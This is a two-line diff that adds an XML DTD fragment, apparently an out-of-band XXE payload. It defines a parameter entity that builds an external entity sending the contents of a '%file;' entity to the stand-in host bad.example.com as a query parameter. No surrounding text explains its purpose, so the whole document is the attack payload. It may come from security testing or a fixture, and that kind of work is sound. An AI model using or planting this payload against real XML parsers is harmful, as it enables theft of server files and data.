@@ -1,0 +1,2 @@
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://bad.example.com/?collect=%file;'>">
+%all;
